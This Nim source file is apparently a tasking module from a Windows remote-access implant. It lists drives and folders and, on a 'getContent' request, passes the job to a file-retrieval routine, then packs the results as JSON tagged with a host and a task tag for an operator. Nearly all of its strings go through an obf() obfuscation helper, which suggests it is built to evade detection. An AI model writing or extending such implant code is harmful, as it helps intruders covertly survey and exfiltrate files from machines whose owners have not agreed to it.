import std/[json, strutils]
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import ../utils/winapi/utils
import execution/core
import files

type Wchar = uint16

const
  fileAttributeDirectory = 0x10'u32
  invalidFileAttributes = 0xFFFFFFFF'u32

proc hasGetContent(parameters: string): bool =
  # Checks that params request file content
  if parameters.len == 0:
    return false
  try:
    let parsed = parseJson(parameters)
    case parsed.kind
    of JObject:
      if not parsed.hasKey(obf("getContent")):
        return false
      let v = parsed[obf("getContent")]
      if v.kind == JNull:
        return false
      let r = v.kind == JBool and v.getBool()
      return r
    of JString:
      try:
        let inner = parseJson(parsed.getStr())
        if inner.kind != JObject or not inner.hasKey(obf("getContent")):
          return false
        let v = inner[obf("getContent")]
        if v.kind == JNull:
          return false
        let r = v.kind == JBool and v.getBool()
        return r
      except JsonParsingError:
        return false
    else:
      return false
  except JsonParsingError:
    return false

proc skipDot(name: ptr UncheckedArray[Wchar]): bool =
  # Checks that a name is the current or parent entry
  if name[0] != Wchar(ord('.')): return false
  if name[1] == 0'u16: return true
  name[1] == Wchar(ord('.')) and name[2] == 0'u16

proc cleanPath(path: string): string =
  # Cleans a path string for listing
  var s = path.strip().replace("/", "\\")
  if s.len == 0:
    return ""
  if s.len >= 2 and s[1] == ':':
    let d = s[0].toUpperAscii()
    if s.len == 2:
      result = $d & ":\\"
      return result
    if s.len == 3 and s[2] == '\\':
      result = $d & ":\\"
      return result
    while s.len > 3 and s[^1] == '\\':
      s.setLen(s.len - 1)
  else:
    while s.len > 1 and s[^1] == '\\':
      s.setLen(s.len - 1)
  result = s

proc isRootRequest(path: string): bool =
  # Checks that the request asks for the drive root
  let s = path.strip()
  let r = s.len == 0 or s == "/" or s == "\\" or s == " "
  return r

proc joinPath(base, name: string): string =
  # Joins a base path and a name
  if base.len == 0:
    result = name
  elif base[^1] == '\\':
    result = base & name
  elif base[^1] == ':':
    result = base & "\\" & name
  else:
    result = base & "\\" & name

proc findPattern(path: string): string =
  # Builds a wildcard pattern for a directory
  let p = cleanPath(path)
  if p.len == 0:
    result = "*"
  elif p.len == 2 and p[1] == ':':
    result = p & "\\*"
  elif p[^1] == '\\':
    result = p & "*"
  else:
    result = p & "\\*"

proc formatSize(bytes: uint64): string =
  # Formats a byte count as a size string
  var buf: array[16, char]
  let n = fmtSize(bytes, buf)
  if n > 0:
    result = newString(n)
    copyMem(addr result[0], addr buf[0], n)
  else:
    result = obf("0 B")

proc lastEditFromFind(data: openArray[byte]): string =
  # Reads the last edit date from a find record
  if rdLe32(data, 20) == 0 and rdLe32(data, 24) == 0:
    return obf("unknown")
  var st: array[16, byte]
  var dateBuf: array[20, char]
  if fileTimeToSystemTime(addr data[20], addr st[0]) == 0:
    return obf("unknown")
  let n = fmtSystemTime(st, dateBuf)
  if n < 10:
    return obf("unknown")
  result = newString(10)
  copyMem(addr result[0], addr dateBuf[0], 10)

proc lastEditForPath(path: string): string =
  # Reads the last edit date of a path
  var w: array[520, uint16]
  asciiWide(findPattern(path), w)
  var data: array[592, byte]
  let h = findFirstFileW(addr w[0], addr data[0])
  if h == invalidHandle:
    return obf("unknown")
  defer:
    discard findClose(h)
  result = lastEditFromFind(data)

proc pathExists(path: string): bool =
  # Checks that a path exists
  var w: array[520, uint16]
  asciiWide(cleanPath(path), w)
  let r = getFileAttributesW(addr w[0]) != invalidFileAttributes
  return r

proc isDirectory(path: string): bool =
  # Checks that a path is a directory
  var w: array[520, uint16]
  asciiWide(cleanPath(path), w)
  let attrs = getFileAttributesW(addr w[0])
  if attrs == invalidFileAttributes:
    return false
  let r = (attrs and fileAttributeDirectory) != 0
  return r

proc countEntries(path: string): int =
  # Counts entries inside a directory
  var wpat: array[560, uint16]
  asciiWide(findPattern(path), wpat)
  var data: array[592, byte]
  let h = findFirstFileW(addr wpat[0], addr data[0])
  if h == invalidHandle:
    return 0
  defer:
    discard findClose(h)
  result = 0
  while true:
    let name = cast[ptr UncheckedArray[Wchar]](addr data[44])
    if not skipDot(name):
      inc result
    zeroMem(addr data[0], data.len)
    if findNextFileW(h, addr data[0]) == 0:
      break

proc nameFromFind(data: openArray[byte]): string =
  # Reads the entry name from a find record
  let namePtr = cast[ptr UncheckedArray[Wchar]](unsafeAddr data[44])
  var nameArr: array[260, uint16]
  var i = 0
  while i < nameArr.high and namePtr[i] != 0'u16:
    nameArr[i] = namePtr[i]
    inc i
  nameArr[i] = 0'u16
  var buf: array[260, char]
  let n = wtoa(nameArr, buf)
  if n <= 0:
    return ""
  result = newString(n)
  copyMem(addr result[0], addr buf[0], n)

proc entryFromFind(basePath: string; data: openArray[byte]): JsonNode =
  # Builds a json entry from a find record
  let name = nameFromFind(data)
  let full = joinPath(basePath, name)
  let attrs = rdLe32(data, 0)
  let isDir = (attrs and fileAttributeDirectory) != 0
  let typ = if isDir: obf("folder") else: obf("file")
  let last = lastEditFromFind(data)
  let sz =
    if isDir:
      $countEntries(full)
    else:
      let size = (uint64(rdLe32(data, 28)) shl 32) or uint64(rdLe32(data, 32))
      formatSize(size)
  result = %*{
    obf("path"): full,
    obf("lastEdit"): last,
    obf("type"): typ,
    obf("size"): sz,
  }

proc listPath(path: string): seq[JsonNode] =
  # Lists entries inside a directory
  result = @[]
  var wpat: array[560, uint16]
  asciiWide(findPattern(path), wpat)
  var data: array[592, byte]
  let h = findFirstFileW(addr wpat[0], addr data[0])
  if h == invalidHandle:
    return @[]
  defer:
    discard findClose(h)
  let base = cleanPath(path)
  while true:
    let name = cast[ptr UncheckedArray[Wchar]](addr data[44])
    if not skipDot(name):
      result.add(entryFromFind(base, data))
    zeroMem(addr data[0], data.len)
    if findNextFileW(h, addr data[0]) == 0:
      break

proc listRootDrives(): seq[JsonNode] =
  # Lists the logical drives
  result = @[]
  var drives: array[512, uint16]
  let n = getLogicalDriveStringsW(culong(drives.len), addr drives[0])
  if n == 0:
    return @[]
  var i = 0
  while i < int(n):
    var driveW: array[8, uint16]
    var j = 0
    while drives[i + j] != 0'u16 and j < driveW.len - 1:
      driveW[j] = drives[i + j]
      inc j
    if j >= 2:
      driveW[j] = 0'u16
      var drive: array[8, char]
      let dl = wtoa(driveW, drive)
      if dl <= 0:
        i += j + 1
        continue
      var d = newString(dl)
      copyMem(addr d[0], addr drive[0], dl)
      if d.len == 0 or (d.len > 0 and ord(d[0]) == 0):
        i += j + 1
        continue
      let drivePath = cleanPath(d)
      if drivePath.len == 0:
        i += j + 1
        continue
      result.add(%*{
        obf("path"): drivePath,
        obf("lastEdit"): lastEditForPath(drivePath),
        obf("type"): obf("folder"),
        obf("size"): $countEntries(drivePath),
      })
    i += j + 1

proc jobMessage*(host, taskTag, input, params: string): string =
  # Main function that builds the folder listing message
  if hasGetContent(params):
    files.runGetContent(host, taskTag, input, params)
    return ""

  let raw = input.strip()

  if isRootRequest(raw):
    let content = listRootDrives()
    return $( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("content"): content,
    })

  let inputPath = cleanPath(raw)

  if not pathExists(inputPath) or not isDirectory(inputPath):
    return $( %*{
      obf("option"): obf("output"),
      obf("type"): obf("folders"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("error"): obf("Path does not exist"),
    })

  let content = listPath(inputPath)
  result = $( %*{
    obf("option"): obf("output"),
    obf("type"): obf("folders"),
    obf("host"): host,
    obf("task_tag"): taskTag,
    obf("content"): content,
  })

proc run*(host, taskTag, input, params: string; buf: var openArray[char]): int =
  # Writes the folder message into the output buffer
  let msg = jobMessage(host, taskTag, input, params)
  let n = writeMsg(msg, buf)
  n
